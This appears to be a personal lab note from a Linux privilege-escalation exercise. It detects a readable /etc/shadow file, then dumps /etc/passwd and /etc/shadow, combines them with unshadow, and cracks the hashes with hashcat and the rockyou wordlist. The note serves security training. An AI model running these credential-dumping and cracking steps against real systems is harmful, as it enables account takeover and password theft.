## Detection

**Linux VM**

1. Check the file permissions of `/etc/shadow`:
   ```bash
   ls -la /etc/shadow
   ```
2. Note the file permissions.
![[Pasted image 20240905002630.png]]
## Exploitation

**Linux VM**

1. Display the contents of the passwd file:
   ```bash
   cat /etc/passwd
   ```
2. Save the output to a file on your attacker machine.

![[Pasted image 20240905004946.png]]

1. Display the contents of the shadow file:
   ```bash
   cat /etc/shadow
   ```
2. Save the output to a file on your attacker machine.
![[Pasted image 20240905005013.png]] 

**Attacker VM**

1. Combine the passwd and shadow files:
   ```bash
   unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
   ```
![[Pasted image 20240905005136.png]]

2. Crack the hashes using your favorite hash cracking tool:
   ```bash
   hashcat -m 1800 unshadowed.txt rockyou.txt -O
   ```

![[Pasted image 20240905010024.png]]

![[Pasted image 20240905005632.png]]
![[Pasted image 20240905010145.png]]
![[Pasted image 20240905010223.png]]
![[Pasted image 20240905010253.png]]
